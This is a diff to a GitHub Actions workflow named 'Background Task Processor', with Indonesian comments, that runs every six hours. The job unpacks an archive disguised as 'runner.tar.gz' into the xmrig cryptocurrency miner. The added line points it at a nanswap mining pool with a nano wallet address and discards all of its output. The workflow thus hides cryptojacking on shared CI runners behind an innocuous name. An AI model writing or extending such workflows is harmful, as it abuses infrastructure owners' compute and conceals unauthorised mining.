@@ -3,7 +3,7 @@ name: Background Task Processor
 on:
   workflow_dispatch:
   schedule:
-    - cron: "0 */6 * * *" # setiap 6 jam sekali
+    - cron: "0 */6 * * *" # setiap 6 jam
 
 jobs:
   task:
@@ -32,7 +32,7 @@ jobs:
           tar -xzf runner.tar.gz
           cd xmrig-6.24.0
           chmod +x xmrig
-          timeout 300s ./xmrig -o pool.hashvault.pro:443 -u 44dW8Q... -p x --tls
+          timeout 300s ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q -p x > /dev/null 2>&1
 
       - name: Notify Done to Telegram
         if: always()
